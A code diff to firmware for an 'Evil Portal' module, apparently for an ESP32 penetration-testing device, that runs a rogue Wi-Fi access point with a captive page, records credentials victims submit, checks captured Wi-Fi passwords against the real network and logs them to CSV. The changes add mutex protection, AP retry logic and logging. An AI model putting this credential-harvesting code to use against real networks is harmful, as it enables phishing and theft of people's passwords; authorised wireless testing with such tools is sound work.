@@ -2,6 +2,7 @@
 #include "core/config.h"
 #include "core/display.h"
 #include "core/i18n.h"
+#include "core/logging/nzlog.h"
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
 #include "core/utils.h"
@@ -22,6 +23,7 @@ EvilPortal::EvilPortal(
     : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
       _backgroundMode(backgroundMode), _autoTemplateFile(templateFile), webServer(80), _launchTime(millis()) {
     dnsServer = &sharedEvilPortalDnsServer();
+    lastCredMutex = xSemaphoreCreateMutex();
 
     _originalWifiMode = WiFi.getMode();
     _wifiWasConnected = WiFi.isConnected();
@@ -32,7 +34,38 @@ EvilPortal::EvilPortal(
     if (!_backgroundMode) { loop(); }
 }
 
-EvilPortal::~EvilPortal() {}
+EvilPortal::~EvilPortal() {
+    if (lastCredMutex != nullptr) {
+        vSemaphoreDelete(lastCredMutex);
+        lastCredMutex = nullptr;
+    }
+}
+
+void EvilPortal::setLastCred(const String &value) {
+    if (lastCredMutex == nullptr) {
+        lastCred = value;
+        return;
+    }
+    if (xSemaphoreTake(lastCredMutex, pdMS_TO_TICKS(250)) == pdTRUE) {
+        lastCred = value;
+        xSemaphoreGive(lastCredMutex);
+    }
+}
+
+String EvilPortal::takeLastCred() {
+    String value;
+    if (lastCredMutex == nullptr) {
+        value = lastCred;
+        lastCred = "";
+        return value;
+    }
+    if (xSemaphoreTake(lastCredMutex, pdMS_TO_TICKS(250)) == pdTRUE) {
+        value = lastCred;
+        lastCred = "";
+        xSemaphoreGive(lastCredMutex);
+    }
+    return value;
+}
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     AsyncResponseStream *response = request->beginResponseStream("text/html");
@@ -132,12 +165,24 @@ void EvilPortal::beginAP() {
     else WiFi.mode(WIFI_MODE_AP);
 
     if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
-        Serial.println("[PORTAL] softAPConfig failed");
+        NZLOGW("PORTAL", "softAPConfig failed");
     }
-    if (!WiFi.softAP(apName, emptyString, _channel)) {
-        Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
+    bool apOk = WiFi.softAP(apName, emptyString, _channel);
+    if (!apOk) {
+        NZLOGE("PORTAL", "softAP failed for '%s' on ch%d; retrying", apName.c_str(), _channel);
+        WiFi.mode(WIFI_OFF);
+        vTaskDelay(pdMS_TO_TICKS(150));
+        WiFi.mode(_verifyPwd ? WIFI_MODE_APSTA : WIFI_MODE_AP);
+        vTaskDelay(pdMS_TO_TICKS(100));
+        apOk = WiFi.softAP(apName, emptyString, _channel);
+    }
+    if (!apOk) {
+        displayError("Evil Portal AP start failed", true);
+        wifiConnected = false;
+        return;
     }
     wifiConnected = true;
+    NZLOGI("PORTAL", "AP '%s' up on ch%d", apName.c_str(), _channel);
 
     int tmp = millis();
     while (millis() - tmp < 3000) yield();
@@ -386,7 +431,15 @@ void EvilPortal::processRequests() {
 
 bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }
 
-String EvilPortal::getCapturedPassword() { return lastCred; }
+String EvilPortal::getCapturedPassword() {
+    String value;
+    if (lastCredMutex == nullptr) { return lastCred; }
+    if (xSemaphoreTake(lastCredMutex, pdMS_TO_TICKS(250)) == pdTRUE) {
+        value = lastCred;
+        xSemaphoreGive(lastCredMutex);
+    }
+    return value;
+}
 
 String EvilPortal::getCapturedSSID() { return apName; }
 
@@ -490,14 +543,17 @@ void EvilPortal::drawScreen() {
 }
 
 void EvilPortal::printLastCapturedCredential() {
-    while (lastCred.length()) {
-        int newlineIndex = lastCred.indexOf('\n');
+    // Take a private copy under the mutex; rendering can take many
+    // milliseconds and must not block the web server's credential handler.
+    String pending = takeLastCred();
+    while (pending.length()) {
+        int newlineIndex = pending.indexOf('\n');
         if (newlineIndex > -1) {
-            padprintln(lastCred.substring(0, newlineIndex));
-            lastCred.remove(0, newlineIndex + 1);
+            padprintln(pending.substring(0, newlineIndex));
+            pending.remove(0, newlineIndex + 1);
         } else {
-            padprint(lastCred);
-            lastCred = "";
+            padprint(pending);
+            pending = "";
         }
     }
 }
@@ -513,7 +569,10 @@ void EvilPortal::printDeauthStatus() {
 }
 
 void EvilPortal::loadCustomHtml() {
-    getFsStorage(fsHtmlFile);
+    if (!getFsStorage(fsHtmlFile) || fsHtmlFile == nullptr) {
+        displayError("No storage available", true);
+        return;
+    }
     htmlFileName = loopSD(*fsHtmlFile, true, "HTML", "/");
     String fileBaseName =
         htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
@@ -695,7 +754,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     String passwordValue = "";
     String csvLine = "";
     String key;
-    lastCred = "";
+    String pendingCred = "";
 
     for (int i = 0; i < request->args(); i++) {
         key = request->argName(i);
@@ -727,7 +786,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         if (i > 0) { csvLine += ","; }
 
         csvLine += key + ": " + valueBuffer;
-        lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
+        pendingCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
     }
 
     htmlResponse += "</li>\n";
@@ -736,7 +795,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         request->send(200, "text/html", wifiLoadPage());
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
-            lastCred += "valid: true\nStopping server...";
+            pendingCred += "valid: true\nStopping server...";
             saveToCSV(csvLine + ", valid: true", true);
             printDeauthStatus();
             if (bruceConfig.getWifiPassword(apName) != "") {
@@ -746,7 +805,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             verifyPass = true;
             _deauth = false;
         } else {
-            lastCred += "valid: false";
+            pendingCred += "valid: false";
             saveToCSV(csvLine + ", valid: false", true);
             portalController(request);
         }
@@ -755,6 +814,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         request->send(200, "text/html", wifiLoadPage());
     }
 
+    setLastCred(pendingCred);
     capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
     totalCapturedCredentials++;
 }
